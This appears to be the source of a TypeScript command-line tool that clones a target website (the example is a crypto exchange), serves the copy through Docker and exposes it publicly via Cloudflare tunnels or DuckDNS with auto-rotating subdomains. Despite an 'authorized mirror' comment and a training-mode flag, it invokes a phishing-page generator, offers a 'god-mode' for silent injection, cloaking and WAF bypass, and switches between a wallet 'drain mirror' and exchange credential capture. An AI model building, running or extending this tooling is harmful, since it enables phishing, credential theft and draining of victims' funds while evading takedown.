/**
 * Authorized mirror — generate clone, start Docker nginx, expose via Cloudflare tunnel.
 *
 * Usage:
 *   pnpm clone-tunnel https://example.com
 *   pnpm clone-tunnel --god-mode --force https://example.com
 *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
 *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
 *
 * Requires: pnpm, tsx, Docker, cloudflared on PATH.
 * Optional: DNSHE_TOKEN + DNSHE_BASE_DOMAIN (god-mode auto subdomain discovery),
 *           DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN + CLOUDFLARE_ZONE_ID for fixed domains.
 * On success prints only the public URL to stdout.
 */
import { spawn } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { access, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import {
  findCampaignByTargetDomain,
  updateCampaignMirrorById,
} from './lib/clone-tunnel-campaign.js'
import {
  createCloudflareMirrorSubdomain,
  hasCloudflareDnsConfig,
  hasDuckDnsConfig,
  readRotateIntervalHours,
  resolveDuckDnsMirrorUrl,
} from './lib/clone-tunnel-dns.js'
import { hasDnsheConfig, provisionDnsheMirror } from './lib/clone-tunnel-dnshe.js'
import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
import {
  buildGeneratorArgv,
  buildGeneratorEnv,
  DEFAULT_BACKEND_URL,
} from './lib/mirror-god-mode.js'
import {
  fetchTargetHomepageHtml,
  isCexDomain,
  runMirrorProbePipeline,
  shouldUseCexClone,
} from './lib/mirror-target-pipeline.js'
import { writeCexStaticServeFiles } from './lib/cex-clone-lib.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')
const BACKEND_URL = process.env['BACKEND_URL']?.trim() || DEFAULT_BACKEND_URL
const MIRROR_PORT = 8080
const GENERATE_TIMEOUT_MS = 180_000
const DOCKER_HEALTH_TIMEOUT_MS = 120_000
const TUNNEL_TIMEOUT_MS = 90_000
const TRYCF_URL_RE = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i
const PUBLIC_URL_RE =
  /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i

function loadEnvFile(filePath: string): void {
  if (!existsSync(filePath)) return
  const content = readFileSync(filePath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let value = trimmed.slice(eq + 1).trim()
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = value
    }
  }
}

loadEnvFile(path.join(REPO_ROOT, '.env'))
loadEnvFile(path.join(REPO_ROOT, '.env.development'))

interface CliArgs {
  targetUrl: string
  subdomain?: string
  godMode: boolean
  rotate: boolean
  rotateHours: number
  campaignId?: string
  forceHardwareBypass: boolean
  force: boolean
}

function fail(message: string): never {
  console.error(`[clone-tunnel] ${message}`)
  process.exit(1)
}

function parseArgs(argv: string[]): CliArgs {
  const args = [...argv]
  let subdomain: string | undefined
  let godMode = false
  let rotate = false
  let rotateHours = readRotateIntervalHours()
  let campaignId: string | undefined
  let forceHardwareBypass = false
  let force = false

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!
    if (arg === '--god-mode') {
      godMode = true
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force') {
      force = true
      args.splice(i, 1)
      i--
    } else if (arg === '--rotate') {
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force-hardware-bypass') {
      forceHardwareBypass = true
      args.splice(i, 1)
      i--
    } else if (arg === '--subdomain') {
      subdomain = args[i + 1]?.trim().toLowerCase().replace(/[^a-z0-9-]/g, '')
      if (!subdomain) fail('--subdomain requires a name (e.g. --subdomain legionmirror)')
      args.splice(i, 2)
      i--
    } else if (arg === '--rotate-hours') {
      const n = Number.parseInt(args[i + 1]?.trim() ?? '', 10)
      if (!Number.isFinite(n) || n <= 0) fail('--rotate-hours requires a positive number')
      rotateHours = n
      args.splice(i, 2)
      i--
    } else if (arg === '--campaign-id') {
      campaignId = args[i + 1]?.trim()
      if (!campaignId) fail('--campaign-id requires a UUID')
      args.splice(i, 2)
      i--
    }
  }

  if (godMode) forceHardwareBypass = true

  const raw = args[0]?.trim()
  if (!raw) {
    fail(
      'Usage: pnpm clone-tunnel [--god-mode] [--force] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
        'Example: pnpm clone-tunnel --god-mode --subdomain myclone https://app.uniswap.org',
    )
  }

  const withScheme = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`
  try {
    const url = new URL(withScheme)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      fail(`Unsupported protocol: ${url.protocol}`)
    }
    return { targetUrl: url.href, subdomain, godMode, rotate, rotateHours, campaignId, forceHardwareBypass, force }
  } catch {
    fail(`Invalid target URL: ${raw}`)
  }
}

function runCommand(
  command: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd: opts?.cwd ?? REPO_ROOT,
      env: opts?.env ?? process.env,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    let stdout = ''
    let stderr = ''
    const timer =
      opts?.timeoutMs != null
        ? setTimeout(() => {
            child.kill('SIGTERM')
          }, opts.timeoutMs)
        : null

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
    })
    child.on('error', (err) => {
      if (timer) clearTimeout(timer)
      reject(err)
    })
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      if (code === 0) {
        resolve({ stdout, stderr })
        return
      }
      const detail = (stderr || stdout).trim().slice(0, 800)
      reject(new Error(detail || `${command} exited with code ${String(code)}`))
    })
  })
}

function extractTrycloudflareUrl(output: string): string | null {
  const match = output.match(TRYCF_URL_RE)
  return match?.[0] ?? null
}

async function generateCexClone(
  targetUrl: string,
  outDir: string,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-cex-login-page.ts')
  await access(generator).catch(() => fail(`CEX generator not found: ${generator}`))

  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    BACKEND_URL: BACKEND_URL,
  }

  try {
    await runCommand(
      'pnpm',
      ['exec', 'tsx', generator, '--authorized', targetUrl, outDir],
      { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS },
    )
  } catch (e) {
    fail(`CEX clone generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await writeCexStaticServeFiles(outDir, MIRROR_PORT)
  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`CEX generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function generateClone(
  targetUrl: string,
  outDir: string,
  godMode: boolean,
  forceHardwareBypass: boolean,
  pipeline?: Awaited<ReturnType<typeof runMirrorProbePipeline>>,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-phishing-page.ts')
  await access(generator).catch(() => fail(`Generator not found: ${generator}`))
  const args = buildGeneratorArgv(targetUrl, outDir, BACKEND_URL, godMode, generator, {
    forceHardwareBypass,
  })
  const childEnv = buildGeneratorEnv(godMode, { forceHardwareBypass })
  if (pipeline?.cookies) {
    childEnv['MIRROR_PROXY_COOKIES'] = pipeline.cookies
  }

  try {
    await runCommand('pnpm', args, { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS })
  } catch (e) {
    fail(`Generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`Generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function resolveCloneGeneration(
  cli: CliArgs,
  outDir: string,
): Promise<'mirror' | 'cex'> {
  const target = new URL(cli.targetUrl)
  await import('node:fs/promises').then((fs) => fs.mkdir(outDir, { recursive: true }))

  const homepageHtml = await fetchTargetHomepageHtml(target)
  if (!cli.force && shouldUseCexClone(target, homepageHtml)) {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return 'cex'
  }

  const pipeline = await runMirrorProbePipeline(target, outDir, { force: cli.force })

  if (!cli.force && pipeline.strategy === 'cex') {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return 'cex'
  }

  if (!cli.force && !pipeline.probeOk && !pipeline.html) {
    if (isCexDomain(target.hostname) || (pipeline.html && shouldUseCexClone(target, pipeline.html))) {
      console.error(
        '[clone-tunnel] WAF blocked mirror — falling back to CEX credential capture mode.',
      )
      await generateCexClone(cli.targetUrl, outDir)
      return 'cex'
    }
    fail(
      `WAF probe failed after headless retry: ${pipeline.detail ?? 'unknown'}. Pass --force to attempt raw mirror anyway.`,
    )
  }

  if (cli.force) {
    process.env['MIRROR_FORCE_RAW'] = 'true'
  }

  await generateClone(cli.targetUrl, outDir, cli.godMode, cli.forceHardwareBypass, pipeline)
  return 'mirror'
}

async function freeMirrorPort(): Promise<void> {
  try {
    const { stdout } = await runCommand(
      'docker',
      ['ps', '-q', '--filter', `publish=${MIRROR_PORT}`],
      { timeoutMs: 15_000 },
    )
    const ids = stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean)
    for (const id of ids) {
      try {
        await runCommand('docker', ['stop', id], { timeoutMs: 30_000 })
      } catch {
        /* continue */
      }
    }
  } catch {
    /* no conflicting container */
  }
}

async function startDockerCompose(outDir: string): Promise<void> {
  await freeMirrorPort()

  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* first run */
  }

  try {
    await runCommand('docker', ['compose', 'up', '-d'], { cwd: outDir, timeoutMs: 120_000 })
  } catch (e) {
    fail(`docker compose up failed: ${e instanceof Error ? e.message : String(e)}`)
  }
}

async function waitForMirrorReady(): Promise<void> {
  const deadline = Date.now() + DOCKER_HEALTH_TIMEOUT_MS

  while (Date.now() < deadline) {
    try {
      const res = await fetch(`http://127.0.0.1:${MIRROR_PORT}/`, {
        signal: AbortSignal.timeout(8_000),
      })
      if (res.ok || res.status === 404) return
    } catch {
      /* nginx still starting */
    }
    await new Promise((r) => setTimeout(r, 2_000))
  }

  fail(`Timed out waiting for mirror on http://127.0.0.1:${MIRROR_PORT}/`)
}

function startCloudflaredTunnel(hostname?: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const args = ['tunnel', '--url', `http://localhost:${MIRROR_PORT}`]
    if (hostname) args.push('--hostname', hostname)

    const child = spawn('cloudflared', args, {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: process.platform === 'win32',
      windowsHide: true,
    })

    let combined = ''
    let settled = false

    const finish = (url: string) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      child.unref()
      resolve(url.replace(/\/$/, ''))
    }

    const failTunnel = (detail: string) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      try {
        child.kill('SIGTERM')
      } catch {
        /* ignore */
      }
      reject(new Error(detail))
    }

    const onData = (chunk: Buffer) => {
      combined += chunk.toString()
      const trycfUrl = extractTrycloudflareUrl(combined)
      if (trycfUrl) finish(trycfUrl)
    }

    child.stdout?.on('data', onData)
    child.stderr?.on('data', onData)
    child.on('error', (err) => failTunnel(err.message))

    const hostnameDeadlineMs = hostname ? 12_000 : TUNNEL_TIMEOUT_MS
    const timer = setTimeout(() => {
      if (hostname) {
        finish(`https://${hostname}`)
        return
      }
      const detail = combined.trim().slice(0, 500)
      failTunnel(detail || 'cloudflared did not return a public URL')
    }, hostnameDeadlineMs)
  })
}

async function resolveDnsMirrorUrl(
  opts: {
    rotate: boolean
    godMode: boolean
    targetUrl: string
    subdomain?: string
  },
): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
  if (opts.godMode && hasDnsheConfig()) {
    const dnshe = await provisionDnsheMirror(opts.targetUrl)
    if (dnshe.ok) {
      try {
        const tunnelUrl = await startCloudflaredTunnel(dnshe.fqdn)
        return { url: tunnelUrl, fqdn: dnshe.fqdn, provider: 'dnshe' }
      } catch (e) {
        console.error(
          `[clone-tunnel] cloudflared --hostname ${dnshe.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — falling back`,
        )
      }
    } else {
      console.error(`[clone-tunnel] DNSHE provisioning failed: ${dnshe.detail} — trying quick tunnel`)
    }
  } else if (opts.godMode && !hasDnsheConfig()) {
    console.error('[clone-tunnel] DNSHE_TOKEN / DNSHE_BASE_DOMAIN not set — using quick tunnel')
  }

  if (opts.godMode) {
    console.error('[clone-tunnel] WARNING: falling back to trycloudflare.com quick tunnel')
    const quickUrl = await startCloudflaredTunnel()
    return { url: quickUrl, provider: 'trycloudflare' }
  }

  if (opts.rotate && hasCloudflareDnsConfig()) {
    const created = await createCloudflareMirrorSubdomain()
    if (created.ok) {
      console.error(`[clone-tunnel] Cloudflare DNS: ${created.mirrorUrl}`)
      return {
        url: created.mirrorUrl.replace(/\/$/, ''),
        fqdn: created.fqdn,
        provider: 'cloudflare',
        recordId: created.recordId,
      }
    }
    console.error(`[clone-tunnel] Cloudflare DNS failed: ${created.detail} — trying DuckDNS`)
  }

  if (opts.subdomain && hasDuckDnsConfig()) {
    const duck = await resolveDuckDnsMirrorUrl(opts.subdomain)
    if (duck.ok) {
      console.error(`[clone-tunnel] DuckDNS: ${duck.mirrorUrl}`)
      return { url: duck.mirrorUrl.replace(/\/$/, ''), fqdn: duck.fqdn, provider: 'duckdns' }
    }
    console.error(`[clone-tunnel] DuckDNS failed: ${duck.detail}`)
  }

  if (opts.subdomain) {
    const fqdn = `${opts.subdomain}.duckdns.org`
    try {
      const tunnelUrl = await startCloudflaredTunnel(fqdn)
      return { url: tunnelUrl, fqdn, provider: 'duckdns+cloudflared' }
    } catch (e) {
      console.error(
        `[clone-tunnel] cloudflared --hostname ${fqdn} failed: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  const quickUrl = await startCloudflaredTunnel()
  return { url: quickUrl, provider: 'trycloudflare' }
}

async function updateCampaignDb(
  opts: CliArgs,
  mirrorUrl: string,
  fqdn?: string,
): Promise<string | undefined> {
  let campaignId = opts.campaignId
  if (!campaignId) {
    const found = await findCampaignByTargetDomain(opts.targetUrl)
    campaignId = found?.id
  }
  if (!campaignId) return undefined

  const updated = await updateCampaignMirrorById(campaignId, {
    mirror_url: `${mirrorUrl}/`,
    mirror_subdomain: fqdn ?? null,
    auto_rotate: opts.rotate,
    rotation_interval_hours: opts.rotateHours,
  })
  if (updated.ok === false) {
    console.error(`[clone-tunnel] Campaign update failed: ${updated.detail}`)
  } else {
    console.error(`[clone-tunnel] Campaign ${campaignId} mirror_url updated`)
  }
  return campaignId
}

function spawnRotationWorker(
  outDir: string,
  state: RotationState,
): void {
  const statePath = path.join(outDir, '.legion-rotate-state.json')
  const workerScript = path.join(REPO_ROOT, 'scripts', 'lib', 'clone-tunnel-rotation-worker.ts')
  const envFile = path.join(REPO_ROOT, '.env')
  const envFlag = existsSync(envFile) ? `--env-file=${envFile}` : ''

  const child = spawn(
    'pnpm',
    ['exec', 'tsx', envFlag, workerScript, '--state', statePath].filter(Boolean),
    {
      cwd: REPO_ROOT,
      detached: true,
      stdio: 'ignore',
      shell: process.platform === 'win32',
      env: process.env,
    },
  )
  child.unref()
  console.error(
    `[clone-tunnel] Rotation worker spawned (every ${state.intervalHours}h) — pid ${child.pid ?? 'unknown'}`,
  )
}

async function main(): Promise<void> {
  const cli = parseArgs(process.argv.slice(2))
  const stamp = new Date().toISOString().replace(/[:.]/g, '-')
  const outDir = path.join(REPO_ROOT, 'clones', `tunnel-${stamp}`)

  if (cli.godMode) {
    console.error('[clone-tunnel] God-mode: silent inject, cloaking, WAF bypass, asset rewrite, experimental stubs')
  }
  if (cli.force) {
    console.error('[clone-tunnel] --force: bypassing CEX auto-detection and WAF abort')
  }

  const mode = await resolveCloneGeneration(cli, outDir)
  if (mode === 'cex') {
    console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
  }
  await startDockerCompose(outDir)
  await waitForMirrorReady()

  let publicUrl: string
  let fqdn: string | undefined
  let recordId: string | undefined
  let provider = 'trycloudflare'

  const dns = await resolveDnsMirrorUrl({
    rotate: cli.rotate,
    godMode: cli.godMode,
    targetUrl: cli.targetUrl,
    subdomain: cli.subdomain,
  })
  publicUrl = dns.url
  fqdn = dns.fqdn
  recordId = dns.recordId
  provider = dns.provider

  if (provider === 'cloudflare' || provider === 'duckdns') {
    console.error(
      `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${MIRROR_PORT} is reachable on VPS`,
    )
  }

  if (!PUBLIC_URL_RE.test(publicUrl)) {
    fail(`Invalid public URL: ${publicUrl}`)
  }

  const campaignId = await updateCampaignDb(cli, publicUrl, fqdn)

  if (cli.rotate && (provider === 'cloudflare' || provider === 'duckdns')) {
    const state: RotationState = {
      campaignId,
      targetUrl: cli.targetUrl,
      intervalHours: cli.rotateHours,
      provider: provider === 'cloudflare' ? 'cloudflare' : 'duckdns',
      duckdnsSubdomain: cli.subdomain,
      lastRecordId: recordId,
      lastMirrorUrl: `${publicUrl}/`,
      lastFqdn: fqdn ?? publicUrl.replace(/^https:\/\//, ''),
      startedAt: new Date().toISOString(),
    }
    const statePath = path.join(outDir, '.legion-rotate-state.json')
    await writeFile(statePath, `${JSON.stringify(state, null, 2)}\n`, 'utf8')
    spawnRotationWorker(outDir, state)
  }

  process.stdout.write(`${publicUrl}\n`)
}

main().catch((e) => {
  fail(e instanceof Error ? e.message : String(e))
})
